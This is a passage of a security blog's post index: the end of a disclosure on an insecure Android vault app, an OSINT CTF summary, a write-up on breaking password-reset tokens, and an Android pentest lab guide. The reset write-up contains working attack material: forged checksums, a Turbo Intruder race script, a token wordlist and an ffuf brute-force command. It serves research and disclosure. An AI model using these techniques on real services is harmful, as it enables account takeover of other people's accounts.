&amp;&amp; isInImagesActivity) {                 ...             } else if (!booleanExtra &amp;&amp; isInVideosActivity) {                 ...             } else {                 this.serviceWorkingForImages = false;                 showDownLoadComplete(context, stringExtra, stringExtra2);             }         }     ...     void showDownLoadComplete(Context context, String title, String message) {         NotificationCompat.Builder priority = new NotificationCompat.Builder(context, this.channelID).setSmallIcon(17301634).setContentTitle(title).setContentText(message).setSubText(\"You can view files now\").setWhen(System.currentTimeMillis()).setAutoCancel(true).setDefaults(-1).setPriority(1);         NotificationManager notificationManager = (NotificationManager) context.getSystemService(\"notification\");         if (Build.VERSION.SDK_INT &gt;= 26) {             notificationManager.createNotificationChannel(new NotificationChannel(this.channelID, this.channelName, 4));         }         notificationManager.notify(1, priority.build());     }  We only have to interact with the correct intent (serviceEnds) and send every required parameter:  PS &gt; .\\platform-tools\\adb.exe shell am broadcast -n com.techuz.privatevault/com.techuz.privatevault.service.MyBroadcastReceiver -a serviceEnds --ei numCallbacks 0 --ez serviceRunningForImages true --es notificationTitle \"Scam\" --es notificationMessage \"0xbro-was-here\" Broadcasting: Intent { act=serviceEnds flg=0x400000 cmp=com.techuz.privatevault/.service.MyBroadcastReceiver (has extras) } Broadcast completed: result=0     Conclusion  A vault should securely protect our data and secrets from prying eyes and unwanted access. However, this does not apply to Digital Private Vault, whose operation - already insecure due to the absence of encryption - can be subverted entirely in such a way as to retrieve every content stored in the vault.  This is neither the first nor the last of the insecure vaults, but this should make us consider to who we entrust our secrets and how they manage and guard them. There will probably be many other similar applications with the same problems out there, whose owners are unaware that their data are not safe.  Secrets managed by the vault should never be stored in clear-text 10. Ideally, they should be encrypted and, even better, managed by a backend instead of saved locally (especially passwords, pins, and decryption keys) 11. Those secrets should also never be logged 12. The content provider should not be exported, and strict controls should be implemented on the types of files retrieved through it. It is also recommended to implement some mechanisms for certificate pinning 13, root detection, emulation detection, and code obfuscation in order to make application analysis more difficult.  Disclosure Timeline    Please refer to the disclosure policy page for further details about the disclosure policy adopted by 0xbro.      05/04/2023: Identification of the vulnerabilities.   06/04/2023: Contacted Digital Private Vault for the first time but didn‚Äôt received any response.   21/04/2023: Contacted Digital Private Vault the second time, without receiving any response.   03/05/2023: Contacted Techuz and Digital Private Vault for the third and last time, without receiving any response.   29/06/2023: Public release.                    Shodan - 52.15.243.62:27017¬†&#8617;&#xfe0e;                 Android Hacking - How to set up an Android Penetration Testing Lab from scratch¬†&#8617;&#xfe0e;                 Mobile Security Framework¬†&#8617;&#xfe0e;                 Dex to Java decompiler¬†&#8617;&#xfe0e;                 android:exported¬†&#8617;&#xfe0e;                 Receiving an implicit intent¬†&#8617;&#xfe0e;                 AppPreferenceManager¬†&#8617;&#xfe0e;                 mPrefs¬†&#8617;&#xfe0e;                 ContentProvider¬†&#8617;&#xfe0e;                 Cryptographic Storage Cheat Sheet¬†&#8617;&#xfe0e;                 Password Storage Cheat Sheet¬†&#8617;&#xfe0e;                 Logging Cheat Sheet¬†&#8617;&#xfe0e;                 Pinning Cheat Sheet¬†&#8617;&#xfe0e;"
  },
  
  {
    "title": "Getting Started with GeoGuessr and OSINT (UMDCTF 2023)",
    "url": "/posts/osint-and-geoguessr-ctf/",
    "categories": "Articles & Writeups, InfoSec Education",
    "tags": "OSINT, GeoGuessr, UMDCTF",
    "date": "2023-05-16 00:00:00 +0200",
    "content": "Introduction In this video, we dive into OSINT and GeoGuessr-like CTFs solving every OSINT challenge from the UMDCTF 2023. During the process, I show you how to solve all the challenges while sharing some basic techniques to identify publicly available information and basic advice for GeoGuessr-like challenges.  Video   References List of sites mentioned within the video:    Utility poles in Taiwan   Geoguessr map - Poles   GeoGuide - Taiwan   Taiwan Power Company grid   Google cache   Archive.today   Wayback Machine   Google quoted search   Amazon wedding list   OSINT Framework   Twitter Advanced Search   Telegram research bot   IntelTechniques   sector035 links"
  },
  
  {
    "title": "Defeating custom password reset tokens",
    "url": "/posts/hacking-custom-reset-password-tokens/",
    "categories": "Articles & Writeups, Web Hacking",
    "tags": "",
    "date": "2023-05-16 00:00:00 +0200",
    "content": "This blog post details two different ways I have used to circumvent the implementation of a flawed forgot password feature and achieve account takeover. The first technique involved using some information disclosed by the server to guess an anti-tampering token to reset any user‚Äôs password, while the latter involved the exploitation of a time-based attack together with the sandwich attack to generate some forgot-password tokens and brute-force the victim‚Äôs one   Introduction As mentioned in the abstract this blog post shows two different techniques I used to attack and defeat a weak forgot password implementation.  The first technique exploits the fact that the client-side application signed a parameter used as a checksum to validate the content of requests. Thanks to certain information disclosed by the server, it was possible to arbitrarily calculate each checksum, thus making it possible to exploit a weak forgot password function and reset the password of any user.  The second technique instead exploits the weakness of the application‚Äôs generated password reset tokens. These tokens are custom-generated and are easily reconstructed. Since every user can register and create an account on this application, it was possible to use the single-packet attack 1 technique together with the sandwich attack 2 to generate three tokens at the same time and through a bit of analysis and brute-force, obtain the specific token for the victim account.  Lets now take a closer look at the two attacks üîé.  Breaking weak client-side checksum using disclosed information  Forgot password HTTP requests The target application provided an API used to reset a user‚Äôs password when he forgot it. The API was /services/foo/login/v1/forgotpassword and accepted a specific JSON body. If the email existed, the server returned the uid field of the selected e-mail as a response, sending the relevant password reset e-mail in the meantime:  POST /services/foo/login/v1/forgotpassword HTTP/2 Host: www.redacted.com Content-Type: application/json  {     \"ldapValRequest\":{         \"email\":\"0xbro-test-1337@yopmail.com\",         \"flag\":\"2\",         \"requestData\":{             \"clientAppId\":\"FLTUSEN\",             \"dataSizeKey\":\"681fbb020ca58f49ad1ad41c1689e501253c8493c761ee3eb7046c8c0b7fb216\"         }     } }   HTTP/2 200 OK Content-Type: application/json  {     \"ldapValResponse\":{     \"errors\":[],     \"status\":\"true\",     \"email\":\"0xbro-test-1337@yopmail.com\",     \"uid\":\"FLTUSENE2407040512811107W\"     } }   Clicking the link arrived by email users were then prompted to insert the new password for their account. At this point, the application validated the token sent by email via the /services/foo/login/v1/password/validation API:  POST /services/foo/login/v1/password/validation HTTP/2 Host: www.redacted.com Content-Type: application/json  {     \"frgtPwdGetQuestionRequest\":{         \"token\":\"FLTUSENO07a43608\",         \"requestData\":{             \"clientAppId\":\"FLTUSEN\",             \"country\":\"US\",             \"language\":\"EN\",             \"vin\":\"\",             \"dataSizeKey\":\"7aafb36a4fd657ccedd97c24b2f65eb041b6430e5b28d82071fa41106ec18577\"         }     } }   HTTP/2 200 OK Content-Type: application/json  {     \"frgtPwdGetQuestionResponse\":{         \"data\":{             \"pwdQuestion\":\"\",             \"pwdQuestion2\":\"\",             \"uid\":\"FLTUSENE2407040512811107W\",             \"email\":\"0xbro-test-1337@yopmail.com\"         },         \"status\":\"true\"     } }   If the status was true, the application proceeded to reset the user‚Äôs password via the /services/foo/login/v1/password/reset API:  POST /services/foo/login/v1/password/reset HTTP/2 Host: www.redacted.com Content-Type: application/json  {     \"rstPasswordRequest\": {         \"requestData\": {             \"clientAppId\": \"FLTUSEN\",             \"country\": \"US\",             \"language\": \"EN\",             \"uid\": \"FLTUSENE2407040512811107W\",             \"newPassword\": \"Pwn3dAcc\",             \"dataSizeKey\": \"6c41c41706afbd392d521cee7fbdf805225fc55542f7a6db1ae98be01059c3a1\"         }     } }   HTTP/2 200 OK Content-Type: application/json  {\"rstPasswordResponse\":{\"status\":\"true\"}}   Taking a closer look at the whole process, we can notice the following issues:    The solution never uses tokens generated using a cryptographically safe algorithm   The uid field required to reset a specific user‚Äôs password is disclosed before the reset token is validated   The /password/reset API takes for granted that the password reset token has already been validated since we have a valid uid and the token is not included in the request   By combining all these factors, it seems possible to reset a user‚Äôs password knowing only the e-mail address.  We can see, however, that every request sent to APIs contains a dataSizeKey field that seems to serve as an anti-tampering token. Theoretically, this field should prevent the possibility of re-sending the same password reset request to a user with a different uid. As we can observe, however, this field is never included in server responses, but only ever appears inside HTTP requests, which means that it is necessarily calculated client-side.  But how?  Guessing dataSizeKey Taking a look at the javascript file ForgotPassword.js used to send the forgot password request, we can see that the dataSizeKey field is calculated using only values known to the user:  ... var clientAppId = FG.clientAppId; var dataSizeKey = formvault(clientAppId + emailID + '2'); ... var reqstData = {     \"ldapValRequest\": {     \"email\": emailID,     \"flag\": \"2\",     \"requestData\": {         \"clientAppId\": clientAppId,         \"dataSizeKey\": dataSizeKey     }     } }; ...  What about the token sent in the password reset request?  I have never been good at equations, but if v1/forgotpassword : ForgotPassword.js = v1/password/reset : X  then X should be something like ResetPassword.js, right?  Right, and we can see that dataSizeKey is calculated in a similar way as before:  var uid = (res.frgtPwdGetQuestionResponse.data.uid) ? res.frgtPwdGetQuestionResponse.data.uid : ''; var reqstData = { \"rstPasswordRequest\": {     \"requestData\":{     \"clientAppId\": FG.clientAppId,     \"country\": FG.country,     \"language\": FG.language,     \"uid\": uid,     \"newPassword\": formData['confpassword']     } } }; reqstData.rstPasswordRequest.requestData[\"dataSizeKey\"] = formvault(     FG.clientAppId + uid + formData['confpassword']     // sha256(\"FLTUSEN\"+\"FLTUSENE2407040512811107W\"+\"Pwn3dAcc\")     );   uid is the field we obtain as a result of the request to v1/forgotpassword, and the other fields are all known or user-controlled values.  $ echo -n 'FLTUSENFLTUSENE2407040512811107WPwn3dAcc' | sha256sum  6c41c41706afbd392d521cee7fbdf805225fc55542f7a6db1ae98be01059c3a1   This means that having a valid user‚Äôs e-mail address is enough to reset his password.   leaked user uid and reset its password   logged in on behalf of the user  Calculate and brute-force weak tokens with the Sandwich Attack  The hot-fix to the previous flaw Following the first flaw, it was suggested to the development team to modify the password reset mechanism, remove the information returned in server responses, and introduce random tokens generated with cryptographically safe algorithm.  However, they chose to take the easy route by removing the uid from the /forgotpassword server response, eliminating the dataSizeKey field from the entire forgot password mechanism, and replacing the uid field with token in /password/reset without switching to a more robust and random token.   forgotpassword request and response comparison   password/reset request comparison  In doing so, it is no longer possible to reset a user‚Äôs password at will via the /password/reset API because you must first find a way to leak the necessary password reset token.  Token analysis  By generating several forgot password emails spread and grouped over several days and times, and analysing the subsequent tokens, we can identify some interesting common patterns.  /reset-password.php?token=FLTUSENh11R22508 /reset-password.php?token=FLTUSENe11H52508 /reset-password.php?token=FLTUSENj11g42508 /reset-password.php?token=FLTUSENz11X01408 /reset-password.php?token=FLTUSENU11N21611 /reset-password.php?token=FLTUSENw11n62910 /reset-password.php?token=FLTUSENL11T53909   Tokens are generated following this schema:  FLTUSEN (undefined letter) (month number) (undefined letter) (undefined number) (minutes) (seconds) FLTUSEN          h               11                 R                 2             25       08 FLTUSEN          e               11                 H                 5             25       08 FLTUSEN          j               11                 g                 4             25       08 FLTUSEN          z               11                 X                 0             14       08 FLTUSEN          U               11                 N                 2             16       11 FLTUSEN          w               11                 n                 6             29       10 FLTUSEN          L               11                 T                 5             39       09   Since tokens are generated with precision down to the second (which is quite relaxed), and we can predict most of the token‚Äôs components, there are approximately 27.040 combinations for a single second. This results from having to guess two letters (with unknown case) and one digit (52 √ó 52 √ó 10).  Fortunately for us, the server is poorly configured and does not distinguish between upper and lower case letters, thus allowing us to reduce the number of possibilities to 6.760 (26 √ó 26 √ó 10).   Second token with inverted upper and lower case random letters is still accepted  Reducing the time window (single-packet attack)  Having reached this point, the last thing to do is to work out in which exact second the request is processed by the server. Time-based attacks are, obviously, very time-sensitive, so we have to find a way to pinpoint the exact moment when the server calculates the token 3.  The application server supports HTTP/2, so we can use the single-packet attack 1 to send two or more requests down the same HTTP connection, obtaining zero latency between them.  My initial assumption was that by sending two requests at the exact same time, one with the attacker‚Äôs email and one with the victim‚Äôs email, the server would process them at the same time and thus assign the same exact token to both requests.  sequenceDiagram     autonumber     par h17:39:09         Client-&gt;&gt;+Server: attacker@email.com         Note over Server: Token is FLTUSENL11T53909         Client-&gt;&gt;Server: victim@email.com         Note over Server: Token is FLTUSENL11T53909     end         create participant attacker@email.com         Server--&gt;&gt;attacker@email.com: /reset.html?token=FLTUSENL11T53909         destroy attacker@email.com         create participant victim@email.com         Server--&gt;&gt;-victim@email.com: /reset.html?token=FLTUSENL11T53909         destroy victim@email.com   I set up Turbo Intruder 4 to send 5 HTTP requests within the same connection using the script below and ran the scan:  def queueRequests(target, wordlists):      # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack     # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead     # for more information, check out https://portswigger.net/research/smashing-the-state-machine     engine = RequestEngine(endpoint=target.endpoint,                            concurrentConnections=1,                            engine=Engine.BURP2                            )      # the 'gate' argument withholds part of each request until openGate is invoked     # if you see a negative timestamp, the server responded before the request was complete     for i in range(5):         engine.queue(target.req, gate='race1')      # once every 'race1' tagged request has been queued     # invoke engine.openGate() to send them in sync     engine.openGate('race1')   def handleResponse(req, interesting):     table.add(req)    Sent 5 forgot password requests down the same HTTP/2 connection concurrently  Unfortunately, the results were different from what was expected: ?token=FLTUSEN P 12 Y 1 4709 ?token=FLTUSEN g 12 J 7 4709 ?token=FLTUSEN V 12 v 7 4709 ?token=FLTUSEN e 12 p 3 4709 ?token=FLTUSEN B 12 A 8 4709   Although all the requests arrived at the server simultaneously, the tokens generated were different. This suggests that the server likely does not support parallel token generation and multi-threading, but processes them sequentially, one at a time. This prevents us from determining the victim‚Äôs exact token but not from predicting the approximate moment it is generated.  Sandwich Attack If we send a request targeting the victim‚Äôs email between two requests targeting an email under our control, we can use the tokens assigned to the latter as a reference to infer the one assigned to the victim 2.  sequenceDiagram     autonumber     par h13:03:10         Client-&gt;&gt;Server: attacker@email.com         Client-&gt;&gt;Server: victim@email.com         Client-&gt;&gt;Server: attacker@email.com     end         Note over Server: attacker token is FLTUSENa11u70310         create participant attacker@email.com         Server--&gt;&gt;attacker@email.com: /reset.html?token=FLTUSENa11u70310         Note over Server: victim token token is ???         create participant victim@email.com         Server--&gt;&gt;victim@email.com: /reset.html?token=???         Note over Server: attacker token is FLTUSENC11I10310         Server--&gt;&gt;attacker@email.com: /reset.html?token=FLTUSENC11I10310         destroy attacker@email.com         destroy victim@email.com   Token results: FLTUSEN a 11 u 7 0310 (attack) FLTUSEN ? 11 ? ? 0310 (victim) FLTUSEN C 11 I 1 0310 (attack)   Using the two tokens we obtained as a template, we can generate all possible missing combinations using crunch 5 or a Python script:  $ crunch 16 16 -t FLTUSEN,11,%0310 -o tokens.txt Crunch will now generate the following amount of data: 114920 bytes 0 MB 0 GB 0 TB 0 PB Crunch will now generate the following number of lines: 6760  FLTUSENA11A00310 FLTUSENA11A10310 FLTUSENA11A20310 FLTUSENA11A30310 FLTUSENA11A40310 FLTUSENA11A50310 FLTUSENA11A60310 FLTUSENA11A70310 FLTUSENA11A80310 FLTUSENA11A90310 ...   After generating every possible combinations, we can brute-force the /password/reset API to identify the user‚Äôs token and reset the password:  $ ffuf -u \"https://www.redacted.com/host/service/password/reset\" -X POST \\ -H \"Content-Type: application/json\" \\ -d \"{\\\"rstPasswordRequest\\\":{\\\"requestData\\\":{\\\"clientAppId\\\":\\\"FLTUSEN\\\",\\\"country\\\":\\\"US\\\",\\\"language\\\":\\\"EN\\\",\\\"token\\\":\\\"FUZZ\\\",\\\"newPassword\\\":\\\"Pwn3dAccount!\\\"}}}\" \\ -w tokens.txt \\ -fs 81 ... FLTUSENE11L10310        [Status: 200, Size: 41, Words: 7, Lines: 1, Duration: 547ms] ...   Depending on the number of attempts made, it could be that the server momentarily blocks the IP performing the bruteforce. If this occurs, it becomes difficult to make the attack reliable because some WAF or protection mechanism may block the attacker before he sends all 6760 combinations.  In this case, increasing the probability of a successful attack is as simple as generating more tokens within the same second the codes are created. Generating more tokens within the 6,760 combination range increases the chances of finding a match, reducing the likelihood of being blocked prematurely.                 The single-packet attack, portswigger.net¬†&#8617;&#xfe0e;¬†&#8617;&#xfe0e;2                 Sandwich Attacks: From Reset Password to Account Takeover, appsec-labs.com¬†&#8617;&#xfe0e;¬†&#8617;&#xfe0e;2                 Time-sensitive attacks, portswigger.net¬†&#8617;&#xfe0e;                 Turbo Intruder, portswigger.net¬†&#8617;&#xfe0e;                 crunch - generate wordlists from a character set, manpages.ubuntu.com¬†&#8617;&#xfe0e;"
  },
  
  {
    "title": "How to set up an Android Penetration Testing Lab from scratch",
    "url": "/posts/android-pentesting-lab/",
    "categories": "Articles & Writeups, Android",
    "tags": "android, hacking-lab",
    "date": "2023-04-30 00:00:00 +0200",
    "content": "Introduction In this post, we explore different ways to create a fully working environment for Android Penetration Testing and we create our setup using the SDK provided by Google (without installing Visual Studio), an Ubuntu machine running on WSL, and also an external virtual machine. Then, we set up the environment to allow communication between Android Virtual Devices and any other VMs. Finally, we explore how to import custom user certificates to intercept HTTPS requests on any version of Android.  Video     Writeup [TL;DR] Introduction and summary  Hey! Today‚Äôs article is very basic. I‚Äôll show you how I set up my Android pentesting environment without using either Genymotion or Android Studio, and then I will give you some little tips on how I managed to solve some little issues that prevented me from using external VMs with this setup. Finally, I will show you a simple trick to install Burpsuite certificates inside the system certificate store on newer Android devices.  Let‚Äôs begin!  From Genymotion to Android‚Äôs cmdline tools  Android application penetration testing requires multiple devices with different OS versions to analyze the behavior of the APK in any possible situation. We need a stable and responsive environment that gives us as much flexibility as possible.  Initially, my first Android emulator was Genymotion. It is easy to set up, supports bridging its network-card adapter instead of using NAT, and uses Virtualbox to emulate the various devices, which at the time was the emulation software I also used to run my Linux machines.  With time, however, I moved to VMWare, and I was forced to look for some Genymotion alternatives because of two main reasons. First, there were some coexistence problems between VMWare and Genymotion,  and second, Genymotion started requiring a paid license to run the latest Android version required to test applications on modern systems.  To overcome these limitations, so, I decided to try the official Android emulator. The one thing that I really hated at the beginning was having to necessarily install Android Studio to use emulators.  Then I realized that Android also provides the android_sdk independently from Android Studio, allowing us to save many gigabytes of space.  This is my current setup, and now I will guide you in creating the same environment for yourself.  Digression on Corellium  A little disclaimer before starting: recently, a new service named Corellium1 broke into the scene as one of the best emulators and testing platforms out there. It allows emulating any Android or iOS device directly in the cloud and also supports ARM devices. The service is not free and is most suited for Enterprises, but it can also be paid based on consumption. If you are unsure, you can also require a free evaluation trial. As I said, it‚Äôs one of the most appreciated emulators, so it‚Äôs nice to know.  And in case you were wondering, no, I‚Äôm not at all affiliated with Corelium, otherwise I wouldn‚Äôt have created the environment that we‚Äôre going to reproduce.  Requirements download and introduction to the Android‚Äôs utilities Let‚Äôs go back to our configuration: the first requirement we must install before setting up the environment is the Java Development Kit2, which we can download from the official Java website.  Once installed, we can download the Android command-line tools3 and Android platform tools4 from the official website. I downloaded the Windows version because my host operating system is Windows 11. On Linux and macOS, however, the process should be the same.  The cmdline-tools5 are the utilities required to download and install new SDK, create and run virtual devices, analyze APKs, and manage the environment.  PS C:\\Users\\bro\\Desktop\\android_tools\\android_sdk\\cmdline-tools\\latest\\bin&gt; ls  Mode                 LastWriteTime         Length Name ----                 -------------         ------ ---- -a----        24/03/2023     20:18           2297 apkanalyzer.bat -a----        24/03/2023     20:18           2288 avdmanager.bat -a----        24/03/2023     20:18           2242 lint.bat -a----        24/03/2023     20:18           2222 profgen.bat -a----        24/03/2023     20:18           2222 retrace.bat -a----        24/03/2023     20:18           2285 screenshot2.bat -a----        24/03/2023     20:18           2295 sdkmanager.bat   Platform tools on the other side, are utilities that interface with the Android platform. The most useful and important ones for our needs are adb, sqlite and fastboot.  PS C:\\Users\\bro\\Desktop\\android_tools\\android_sdk\\platform-tools&gt; ls  Mode                 LastWriteTime         Length Name ----                 -------------         ------ ---- -a----        30/03/2023     10:28        6021632 adb.exe -a----        30/03/2023     10:28          97792 AdbWinApi.dll -a----        30/03/2023     10:28          62976 AdbWinUsbApi.dll -a----        30/03/2023     10:29         241664 dmtracedump.exe -a----        30/03/2023     10:29         432640 etc1tool.exe -a----        30/03/2023     10:29        1866240 fastboot.exe -a----        30/03/2023     10:29          44032 hprof-conv.exe -a----        30/03/2023     10:29         231594 libwinpthread-1.dll -a----        30/03/2023     10:29         469504 make_f2fs.exe -a----        30/03/2023     10:29         469504 make_f2fs_casefold.exe -a----        30/03/2023     10:29           1157 mke2fs.conf -a----        30/03/2023     10:29         747520 mke2fs.exe -a----        30/03/2023     10:28        1073883 NOTICE.txt -a----        30/03/2023     10:40           1367 package.xml -a----        30/03/2023     10:29             38 source.properties -a----        30/03/2023     10:29        1333760 sqlite3.exe   Android SDK download and AVD configuration Alright! Now we must download and install the SDK we will use to create our virtual devices. First, follow the instructions specified in the official documentation6 to create a valid android_sdk environment. I created a specific folder named android_sdk and moved the various tools inside it, as mentioned in the sdkmanager manual.  Now we can use the sdkmanager utility to list and install any desired SDK. Using the --list command we can list all the available kit. The ones we are interested in are the ‚Äúsystem-images‚Äù, however, feel free to experiment also with all the other SDKs.  Once we have chosen a specific SDK, we can install it. Completed the installation process, we can verify that the SDK has been correctly installed using the --list_installed command.  # list all the available sdk  .\\sdkmanager.bat --list ... system-images;android-29;google_apis_playstore;x86                                       | 8            | Google Play Intel x86 Atom System Image system-images;android-29;google_apis_playstore;x86_64                                    | 8            | Google Play Intel x86_64 Atom System Image system-images;android-30;android-tv;x86                                                  | 4            | Android TV Intel x86 Atom System Image system-images;android-30;android-wear-cn;arm64-v8a                                       | 10           | China version of Wear OS 3 - Preview ARM 64 v8a System Image ...  # install a specific sdk .\\sdkmanager.bat --install \"system-images;android-29;google_apis;x86\"  # list installed sdk  .\\sdkmanager.bat --list_installed   Good, at this point we can create a virtual device using the just downloaded SDK.  We can create AVDs using the avdmanager utility7. We can list all the available devices using the list devices command, and we can create a virtual device using create avd with the -n flag to specify a custom name, -k to specify the desired Android API to install, and, eventually, -d to select a specific hardware profile.  In this way can create as many virtual devices we want, and we can list all of them using the list avd command.  # list all possible emulators .\\avdmanager.bat list devices  # create an emulator (C:\\Users\\name\\.android\\avd\\) .\\avdmanager.bat --verbose create avd --force --name \"generic_api29_google_apis_emulator\" --package \"system-images;android-29;google_apis;x86\" --tag \"google_apis\" --abi \"x86\" .\\avdmanager.bat create avd -n \"generic_api29_google_apis_emulator\" -k \"system-images;android-29;google_apis;x86\"  # list installed avd .\\avdmanager.bat list avd Available Android Virtual Devices:     Name: generic_api29_google_apis_emulator     Path: C:\\Users\\bro\\.android\\avd\\generic_api29_google_apis_emulator.avd   Target: Google APIs (Google Inc.)           Based on: Android 10.0 (Q) Tag/ABI: google_apis/x86   Sdcard: 512 MB  # delete emulator  .\\avdmanager.bat delete avd -n generic_api29_google_apis_emulator  # rename emulator .\\avdmanager.bat move avd -n generic_28 -r android-9_api-28   Ok, now we can try those emulators. We can use the emulator tool with the -list-avds option to list all the available devices, and we can run them using the -avd flag followed by the device‚Äôs name. We can also use the -scale parameter to increase or decrease the screen size, and -writable-system to run the emulator with write privileges for system partitions.  # list available emulators PS C:\\Users\\bro\\Desktop\\android_tools\\android_sdk\\emulator&gt; .\\emulator.exe -list-avds generic_api29_google_apis_emulator  # start a device .\\emulator.exe -avd generic_28  # start a device in writable mode with a bigger GUI .\\emulator.exe -avd generic_28 -writable-system -scale 0.6   If your emulator crashes when using the -writable-system flag, enable the Hyper-V support inside the Windows feature men√π and eventually enable also the cold boot8 for your emulator.  The first time we run the emulator, we probably obtain some errors telling us that the tool doesn‚Äôt find the correct paths for the SDK folder.    This is because you are not subscribed to my channel and have not yet left a like. Of course, I‚Äôm joking, but it would be appreciated so much, so thanks in advance!  The reason why we get those errors is that we didn‚Äôt set the ANDROID_HOME environment variable when we downloaded the command-line tools. To fix this issue, we must create the ANDROID_HOME variable containing the android_sdk folder as the value.    Besides that, we also need to manually create a platforms folder inside android_sdk, otherwise, emulator.exe will not work again.     The folder structure must be as the one below:   &gt; Directory: C:\\Users\\bro\\Desktop\\android_tools\\android_sdk   Mode                 LastWriteTime         Length Name ----                 -------------         ------ ---- d-----        30/03/2023     11:22                .temp d-----        30/03/2023     00:13                cmdline-tools d-----        30/03/2023     00:55                emulator d-----        30/03/2023     11:18                licenses d-----        30/03/2023     00:54                patcher d-----        30/03/2023     10:40                platform-tools d-----        30/03/2023     10:29                platforms d-----        30/03/2023     11:18                system-images -a----        30/03/2023     11:24             16 .knownPackages   After rebooting the host machine, we should be able to start our Android Virtual Device.  Unfortunately, the emulator is not yet ready: the hardware buttons are broken. To enable them9, we must go to the .android folder, edit the config.ini file for every emulator we want to fix, and set the hw.keyboard and hw.mainKeys fields to yes.  $ edit ~/.android/avd/&lt;emulator name&gt;/config.ini ... hw.keyboard=yes ... hw.mainKeys=yes ...   If we run the emulator now, the buttons are working as expected and we can finally use it as a traditional physical device.  Current environment limitations Up to this point, the main environment is ready.  We can use the adb binary contained in platform-tools to interact with our virtual devices, and we can even install some other tools, like frida, to expand our toolset. The only limitation is that we are forced to use our host system.  Linux users should not have problems using their host as a testing machine, so, the next part of the post is most suited for Windows users that maybe want to use external virtual machines for testing their apps.  By default, every emulator listens for incoming connections on ports 5554, 5555, or higher, but they are only bound to localhost and cannot be reached by other NATed devices. We can do some port-forwarding magic and make those ports available on all the other interfaces, but adb also requires a USB connection to work properly, so for this single tool, it is better to use the binary provided by the platform-tools.  Nevertheless, we can use frida as a better example to show how to set up all the forwarding rules for all the other necessities.  Frida can be divided into two main components: the frida-server and the frida-tools. In our example, we have a frida-server running on any emulator‚Äôs interface, but we wanna use the frida-tools installed inside an Ubuntu WSL machine instead of the ones installed on the Windows host system.  $ ./frida-server -l 0.0.0.0:10099   Configure different port-forwarding rules to overcome environment limitations Ubuntu and Andriod cannot communicate with each other because they both use a NATed IP.    Ubuntu has an IP of 172.22.172.244 and uses 172.22.160.1  - which is our Windows host machine - as a gateway.  $ ip a 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00     inet 127.0.0.1/8 scope host lo        valid_lft forever preferred_lft forever     inet6 ::1/128 scope host        valid_lft forever preferred_lft forever ... 6: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000     link/ether 00:15:5d:3b:4e:71 brd ff:ff:ff:ff:ff:ff     inet 172.22.172.244/20 ... $ traceroute google.com traceroute to google.com (142.251.209.46), 30 hops max, 60 byte packets  1  0xbro.mshome.net (172.22.160.1)  0.429 ms  0.391 ms  0.364 ms   Android has an IP of 10.0.2.15 and uses a standardized infrastructure10, having a virtual router with IP 10.0.2.1 as a getaway.  Luckily, we can access this virtual router using telnet. The credentials required to access the routers can be found inside the .emulator_console_auth_token file. Once inside, we can set the desired port forwarding rules using the redir add command, followed by the protocol, the port to be opened on the host, and the emulator‚Äôs port bound to the rule.  # Auth credential more C:\\Users\\bro\\.emulator_console_auth_token this_is_a_fake_password  # Login inside the virtual router and set port forwarding telnet 127.0.0.1 5554 Android Console: you can find your &lt;auth_token&gt; in 'C:\\Users\\bro\\.emulator_console_auth_token' OK auth this_is_a_fake_password # For example, the following command sets up a redirection that handles all incoming TCP connections to your host (development) machine on 127.0.0.1:5000 and passes them through to the emulated system on 10.0.2.15:6000 redir add tcp:5000:6000 redir add tcp:10099:27042 PS C:\\WINDOWS\\system32&gt; netstat -ano | findstr 10099   TCP    127.0.0.1:10099        0.0.0.0:0              LISTENING       24980  # List active rules redir list  # Delete a specific rule redir del   Then, we must create another port forwarding rule, this time directly on Windows. This rule is responsible for connecting the port we just opened with redir add - and which is only available in localhost - with another port, this time available on all network interfaces.    For this rule, we can use the netsh interface portproxy command or, in the alternative, ssh.  PS&gt; netsh interface portproxy add v4tov4 listenport=10100 listenaddress=0.0.0.0 connectport=10099 connectaddress=127.0.0.1  PS&gt; netsh interface portproxy show all  Listen on ipv4:             Connect to ipv4:  Address         Port        Address         Port --------------- ----------  --------------- ---------- 0.0.0.0         10100       127.0.0.1       10099   Finally, I recommend disabling any firewall rule enabled on the Windows host so that our internal requests cannot be blocked.  Perfect, at this point the environment is completely set up. We can query the frida-server running on the Android device by targeting the WSL gateway IP on the port opened on the Windows host. If we have configured everything correctly we should receive the output from frida and thus communicate with our device.  We can do the same thing if we need to connect the Android emulator to a virtual machine.  I know is a tricky setup, but someday it may be useful.  Import custom certificates inside Android &gt;=10 At this point, the last thing we need to do is import the burpsuite certificate within the system certificate store. I already talked about certificate stores during the ‚ÄúAndroid Application Pinning Bypass‚Äù video11, so check it out for more details.  By default, the system certificate store is a read-only file system and it‚Äôs pre-populated during the device boot. Luckily, an article12 by mitmproxy shows a fantastic step-by-step procedure that really fits the bill and that we can follow. It shows how to generate a valid certificate for Android, but most importantly shows how to disable the secure boot verification in order to remount the read-only partitions this time with write privileges.  # convert burpsuite certificate from der to cer/pem/crt openssl x509 -inform der -in burp-free.der -out burp-free.cer  # extract the hash to be used for the certificate name openssl x509 -inform PEM -subject_hash_old -in burp-free.cer | head -1 9a5ba575 cp burp-free.cer 9a5ba575.0  # install the certificate inside the system certificate store .\\emulator.exe -avd &lt;avd_name_here&gt; -writable-system .\\adb.exe root .\\adb.exe disable-verity .\\adb.exe reboot .\\adb.exe root .\\adb.exe remount .\\adb.exe push 9a5ba575.0 /system/etc/security/cacerts .\\adb.exe shell chmod 644 /system/etc/security/cacerts/9a5ba575.0 .\\adb.exe reboot  # or  .\\emulator.exe -avd &lt;avd_name_here&gt; -writable-system .\\adb.exe root .\\adb.exe shell avbctl disable-verification .\\adb.exe reboot .\\adb.exe root .\\adb.exe remount .\\adb.exe push 9a5ba575.0 /system/etc/security/cacerts .\\adb.exe shell chmod 644 /system/etc/security/cacerts/9a5ba575.0 .\\adb.exe reboot   Once finished, we can set our proxy using the AVD extended controls and now we should be able to intercept and read all the HTTP traffic generated by our virtual device.  Online I read a lot of threads talking about different methods and procedures, but actually, this was the only one that in my case worked consistently.  Having said that, see you next time! Ciao!                   https://www.corellium.com/¬†&#8617;&#xfe0e;                 